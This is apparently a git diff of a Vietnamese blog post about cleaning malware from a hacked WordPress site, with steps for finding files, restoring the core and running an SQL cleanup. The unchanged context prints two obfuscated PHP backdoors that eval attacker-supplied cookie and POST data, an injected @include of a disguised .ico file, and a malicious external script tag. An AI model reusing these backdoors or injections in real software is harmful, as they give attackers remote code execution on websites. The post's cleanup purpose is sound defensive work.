@@ -1,8 +1,9 @@
 ---
 date: "2018-09-25T12:30:04Z"
+update: "2018-09-25T12:30:04Z"
 template: "post"
 directory: "Thủ thuật IT"
-cover: "../images/minh-da-lam-sach-website-wordpress-nhu-the-nao-completejavascript.com_.png"
+cover: "../../images/thu-thuat-it/minh-da-lam-sach-website-wordpress-nhu-the-nao-completejavascript.com_.png"
 keywords: "làm sạch website wordpress"
 description: "Website bị dính mã độc là điều không ai mong muốn. Bài viết này mình sẽ chia sẻ với bạn các bước mà mình đã thực hiện để làm sạch website Wordpress."
 slug: lam-sach-website-wordpress-nhu-the-nao
@@ -32,7 +33,7 @@ Khi bạn vào một trang bất kì của website thì bỗng nhiên bị chuy�
 
 Nếu bạn vô tình nhấn vào **Cho phép**, có nghĩa là bạn đã cho phép mã độc này thực thi các hành động nguy hiểm, không thể lường trước được.
 
-![Blog bị dính mã độc dẫn đến chuyển hướng](../images/hacked-redirect.png)
+![Blog bị dính mã độc dẫn đến chuyển hướng](../../images/thu-thuat-it/hacked-redirect.png)
 
 Nếu bạn bị chuyển hướng đến những đường link dạng như phía trên, thì tốt nhất là tắt hẳn tab đó đi hoặc thậm chí, tắt luôn cả trình duyệt.
 
@@ -48,7 +49,7 @@ Lượng truy cập trên trang web giảm đột ngột cũng là một dấu h
 
 Đây là trường hợp tệ nhất. Đó là khi bạn truy cập vào trang web và hiện lên hình ảnh như sau:
 
-![Google đã đánh dấu trang web của bạn bị nhiễm mã độc](../images/harmfulprogramserror.jpg)
+![Google đã đánh dấu trang web của bạn bị nhiễm mã độc](../../images/thu-thuat-it/harmfulprogramserror.jpg)
 
 Lúc này, Google đã đánh dấu trang web của bạn bị nhiễm mã độc và không an toàn.
 
@@ -81,17 +82,15 @@ Bây giờ, bắt đầu tiến hành việc làm sạch website Wordpress thôi
 
 Bước đầu tiên để làm sạch website Wordpress là tìm kiếm và xóa những file lạ. Công việc này có thể thực hiện được bằng mắt thường. Trong trường hợp của mình, mình phát hiện có 2 file lạ ngay tại thư mục gốc là:
 
-**2mh7nzt3.php**
-
-```php
+```php:title=2mh7nzt3.php
 <?php
   $wjqja = 'lpxe2yHu*t#v4-6nd_10a73im9gkcfro\'sb';$ghxqjoz = Array();$ghxqjoz[] = $wjqja[20].$wjqja[22].$wjqja[25].$wjqja[14].$wjqja[4].$wjqja[29].$wjqja[19].$wjqja[18].$wjqja[13].$wjqja[20].$wjqja[28].$wjqja[4].$wjqja[19].$wjqja[13].$wjqja[12].$wjqja[21].$wjqja[21].$wjqja[28].$wjqja[13].$wjqja[20].$wjqja[34].$wjqja[22].$wjqja[16].$wjqja[13].$wjqja[19].$wjqja[14].$wjqja[16].$wjqja[3].$wjqja[4].$wjqja[18].$wjqja[29].$wjqja[4].$wjqja[28].$wjqja[4].$wjqja[22].$wjqja[18];$ghxqjoz[] = $wjqja[6].$wjqja[8];$ghxqjoz[] = $wjqja[10];$ghxqjoz[] = $wjqja[28].$wjqja[31].$wjqja[7].$wjqja[15].$wjqja[9];$ghxqjoz[] = $wjqja[33].$wjqja[9].$wjqja[30].$wjqja[17].$wjqja[30].$wjqja[3].$wjqja[1].$wjqja[3].$wjqja[20].$wjqja[9];$ghxqjoz[] = $wjqja[3].$wjqja[2].$wjqja[1].$wjqja[0].$wjqja[31].$wjqja[16].$wjqja[3];$ghxqjoz[] = $wjqja[33].$wjqja[7].$wjqja[34].$wjqja[33].$wjqja[9].$wjqja[30];$ghxqjoz[] = $wjqja[20].$wjqja[30].$wjqja[30].$wjqja[20].$wjqja[5].$wjqja[17].$wjqja[24].$wjqja[3].$wjqja[30].$wjqja[26].$wjqja[3];$ghxqjoz[] = $wjqja[33].$wjqja[9].$wjqja[30].$wjqja[0].$wjqja[3].$wjqja[15];$ghxqjoz[] = $wjqja[1].$wjqja[20].$wjqja[28].$wjqja[27];foreach ($ghxqjoz[7]($_COOKIE, $_POST) as $xhkmij => $onsbeqz){function fnkka($ghxqjoz, $xhkmij, $eixvz){return $ghxqjoz[6]($ghxqjoz[4]($xhkmij . $ghxqjoz[0], ($eixvz / $ghxqjoz[8]($xhkmij)) + 1), 0, $eixvz);}function ndvxy($ghxqjoz, $rtduq){return @$ghxqjoz[9]($ghxqjoz[1], $rtduq);}function mgcvx($ghxqjoz, $rtduq){$bnqfa = $ghxqjoz[3]($rtduq) % 3;if (!$bnqfa) {eval($rtduq[1]($rtduq[2]));exit();}}$onsbeqz = ndvxy($ghxqjoz, $onsbeqz);mgcvx($ghxqjoz, $ghxqjoz[5]($ghxqjoz[2], $onsbeqz ^ fnkka($ghxqjoz, $xhkmij, $ghxqjoz[8]($onsbeqz))));
 }
 ```
 
-**n58afvih.php**
+Và:
 
-```php
+```php:title=n58afvih.php
 <?php
   $wjqja = 'lpxe2yHu*t#v4-6nd_10a73im9gkcfro\'sb';$ghxqjoz = Array();$ghxqjoz[] = $wjqja[20].$wjqja[22].$wjqja[25].$wjqja[14].$wjqja[4].$wjqja[29].$wjqja[19].$wjqja[18].$wjqja[13].$wjqja[20].$wjqja[28].$wjqja[4].$wjqja[19].$wjqja[13].$wjqja[12].$wjqja[21].$wjqja[21].$wjqja[28].$wjqja[13].$wjqja[20].$wjqja[34].$wjqja[22].$wjqja[16].$wjqja[13].$wjqja[19].$wjqja[14].$wjqja[16].$wjqja[3].$wjqja[4].$wjqja[18].$wjqja[29].$wjqja[4].$wjqja[28].$wjqja[4].$wjqja[22].$wjqja[18];$ghxqjoz[] = $wjqja[6].$wjqja[8];$ghxqjoz[] = $wjqja[10];$ghxqjoz[] = $wjqja[28].$wjqja[31].$wjqja[7].$wjqja[15].$wjqja[9];$ghxqjoz[] = $wjqja[33].$wjqja[9].$wjqja[30].$wjqja[17].$wjqja[30].$wjqja[3].$wjqja[1].$wjqja[3].$wjqja[20].$wjqja[9];$ghxqjoz[] = $wjqja[3].$wjqja[2].$wjqja[1].$wjqja[0].$wjqja[31].$wjqja[16].$wjqja[3];$ghxqjoz[] = $wjqja[33].$wjqja[7].$wjqja[34].$wjqja[33].$wjqja[9].$wjqja[30];$ghxqjoz[] = $wjqja[20].$wjqja[30].$wjqja[30].$wjqja[20].$wjqja[5].$wjqja[17].$wjqja[24].$wjqja[3].$wjqja[30].$wjqja[26].$wjqja[3];$ghxqjoz[] = $wjqja[33].$wjqja[9].$wjqja[30].$wjqja[0].$wjqja[3].$wjqja[15];$ghxqjoz[] = $wjqja[1].$wjqja[20].$wjqja[28].$wjqja[27];foreach ($ghxqjoz[7]($_COOKIE, $_POST) as $xhkmij => $onsbeqz){function fnkka($ghxqjoz, $xhkmij, $eixvz){return $ghxqjoz[6]($ghxqjoz[4]($xhkmij . $ghxqjoz[0], ($eixvz / $ghxqjoz[8]($xhkmij)) + 1), 0, $eixvz);}function ndvxy($ghxqjoz, $rtduq){return @$ghxqjoz[9]($ghxqjoz[1], $rtduq);}function mgcvx($ghxqjoz, $rtduq){$bnqfa = $ghxqjoz[3]($rtduq) % 3;if (!$bnqfa) {eval($rtduq[1]($rtduq[2]));exit();}}$onsbeqz = ndvxy($ghxqjoz, $onsbeqz);mgcvx($ghxqjoz, $ghxqjoz[5]($ghxqjoz[2], $onsbeqz ^ fnkka($ghxqjoz, $xhkmij, $ghxqjoz[8]($onsbeqz))));
 }
@@ -107,7 +106,7 @@ Các file php cơ bản như: _index.php, wp-config.php, wp-blog-header.php,..._
 
 Thật may mắn thay khi mở file _index.php_, mình phát hiện có 1 đoạn code lạ ngay ở đầu:
 
-```php
+```php:title=index.php
 /*238d6*/
 
 @include "\057home\064/pha\155vanl\057publ\151c_ht\155l/te\164risg\141mev1\057js/.\144aa29\14473.i\143o";
@@ -126,7 +125,7 @@ Mình thử kiểm tra file kia xem thế nào thì đúng là nó không phải
 Như vậy nghĩa là, rất nhiều file php của mình bị chèn thêm mã độc từ file _.daa29d73.ico_. Do đó, mình tiến hành làm 2 việc:
 
 - Xóa file _.daa29d73.ico_
-- Mở toàn bộ thư mục chứa website trên một code editor (ví dụ: [Visual Studio Code](https://code.visualstudio.com/)). Rồi sử dụng chức năng tìm kiếm để xóa đoạn code _@include_ trên.
+- Mở toàn bộ thư mục chứa website trên một code editor, ví dụ: [Visual Studio Code](https://code.visualstudio.com/). Rồi sử dụng chức năng tìm kiếm để xóa đoạn code _@include_ trên.
 
 Ngoài ra, mình còn tìm kiếm trên toàn bộ website các từ khóa như:
 
@@ -159,7 +158,7 @@ Trước tiên, trong thư mục chứa website, mình giữ lại các file và
 
 Còn lại thì mình xóa bỏ hết và thay thế chúng bởi mã nguồn sạch của Wordpress mà mình mới tải về (và nhớ là khi bạn copy mã nguồn wordpress thì chừa cái **wp-content** và **wp-config.php** ra nhé).
 
-![sao chép phần core wordpress](../images/copy-ma-nguon-wordpress-sach.png)
+![sao chép phần core wordpress](../../images/thu-thuat-it/copy-ma-nguon-wordpress-sach.png)
 
 Sau bước này, mình lại kiểm tra website một lần nữa thì thật buồn là website vẫn bị redirect như thường.
 
@@ -185,15 +184,15 @@ Nhưng không, mình chả việc gì phải tốn công như vậy. Nội dung 
 
 Mình mở **phpMyAdmin** lên (địa chỉ: `http://localhost/phpmyadmin/`) và bắt đầu tìm kiếm như trong hình sau:
 
-![tìm kiếm mã độc trong database mysql](../images/search_phpmyadmin.png)
+![tìm kiếm mã độc trong database mysql](../../images/thu-thuat-it/search_phpmyadmin.png)
 
 Đúng là không ngoài dự đoán, mình tìm thấy **306 kết quả chứa đoạn mã độc** trên:
 
-![Kết quả tìm kiếm mã độc trong database mysql](../images/search_phpmyadmin_result.png)
+![Kết quả tìm kiếm mã độc trong database mysql](../../images/thu-thuat-it/search_phpmyadmin_result.png)
 
 Mình chọn tiếp vào chữ _**Browse**_ để xem cụ thể mã độc nằm ở cột nào trong bảng **wp_luqd_posts:**
 
-![thông tin chi tiết mã độc](../images/search_phpmyadmin_browse.png)
+![thông tin chi tiết mã độc](../../images/thu-thuat-it/search_phpmyadmin_browse.png)
 
 Như vậy, đoạn mã độc nằm trong cột **post_content** của bảng **wp_luqd_posts**. Bây giờ, mình chỉ cần viết câu lệnh SQL để tìm kiếm và thay thế đoạn mã độc kia đi là xong.
 
@@ -203,16 +202,16 @@ Mình tiếp tục chọn mục tab SQL và viết câu lệnh SQL này ra:
 UPDATE wp_luqd_posts set post_content = replace(post_content, "<script src='https://s2.voipnewswire.net/s2.js' type='text/javascript'></script>", '');
 ```
 
-![câu lệnh sql thay thế mã độc bằng kí tự rỗng](../images/phpmyadmin_query.png)
+![câu lệnh sql thay thế mã độc bằng kí tự rỗng](../../images/thu-thuat-it/phpmyadmin_query.png)
 
 Sau khi thực hiện thành công câu lệnh trên, mình kiểm tra lại database một lượt để chắc chắn rằng không tồn tại đoạn mã độc kia nữa.
 
-![kiểm tra lại database xem còn mã độc không](../images/result_phpmyadmin.png)
+![kiểm tra lại database xem còn mã độc không](../../images/thu-thuat-it/result_phpmyadmin.png)
 
 Để chắc chắn hơn, mình tìm kiếm thêm với các từ khóa như:
 
-- _type='text/javascript'_
-- _<script src=_
+- `type='text/javascript'`
+- `<script src=`
 
 Không tìm thêm bất cứ điều gì khả nghi, mình kiểm tra lại website thì thấy nó hoạt động khá ổn, không còn dấu hiệu của Malware nữa.
 
